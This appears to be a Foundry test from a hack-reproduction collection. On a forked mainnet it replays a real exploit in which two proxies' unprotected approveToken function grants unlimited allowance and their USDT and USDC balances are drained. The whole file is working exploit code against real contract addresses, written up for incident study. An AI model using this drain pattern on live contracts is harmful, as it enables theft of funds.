// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~36K USD$ (LEVUSDC) + ~69K USD$ (DEPUSDT)
// Vulnerable Proxy DEPUSDT : https://etherscan.io/address/0x7b190a928aa76eece5cb3e0f6b3bdb24fcdd9b4f
// Vulnerable Proxy LEVUSDC : https://etherscan.io/address/0x2a2b195558cf89aa617979ce28880bbf7e17bc45
// Attack Tx DEPUSDT : https://etherscan.io/tx/0xf0a13b445674094c455de9e947a25bade75cac9f5176695fca418898ea25742f
// Attack Tx LEVUSDC : https://etherscan.io/tx/0x800a5b3178f680feebb81af69bd3dff791b886d4ce31615e601f2bb1f543bb2e

// @Analysis : https://twitter.com/numencyber/status/1669278694744150016?cxt=HHwWgMDS9Z2IvKouAAAA

interface IProxy {
    function approveToken(address token, address pool, uint256 amount) external;
}

interface IToken {
    function balanceOf(address who) external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external;
}

contract ContractTest is Test {
    IToken DEPUSDT = IToken(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IToken LEVUSDC = IToken(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IProxy ProxyDEPUSDT = IProxy(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f);
    IProxy ProxyLEVUSDC = IProxy(0x2a2b195558cF89AA617979ce28880BbF7e17bc45);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_484_161);
        cheats.label(address(DEPUSDT), "DEPUSDT");
        cheats.label(address(LEVUSDC), "LEVUSDC");
        cheats.label(address(ProxyDEPUSDT), "ProxyDEPUSDT");
        cheats.label(address(ProxyLEVUSDC), "ProxyLEVUSDC");
    }

    function testApprove() public {
        // No access controll. Thanks to this, attacker obtained authorization to transfer funds
        ProxyDEPUSDT.approveToken(address(DEPUSDT), address(this), type(uint256).max);

        DEPUSDT.transferFrom(address(ProxyDEPUSDT), address(this), DEPUSDT.balanceOf(address(ProxyDEPUSDT)));

        cheats.roll(17_484_167);

        ProxyLEVUSDC.approveToken(address(LEVUSDC), address(this), type(uint256).max);

        LEVUSDC.transferFrom(address(ProxyLEVUSDC), address(this), LEVUSDC.balanceOf(address(ProxyLEVUSDC)));

        emit log_named_decimal_uint("Attacker DEPUSDT balance after hack", DEPUSDT.balanceOf(address(this)), 6);

        emit log_named_decimal_uint("Attacker LEVUSDC balance after hack", LEVUSDC.balanceOf(address(this)), 6);
    }
}
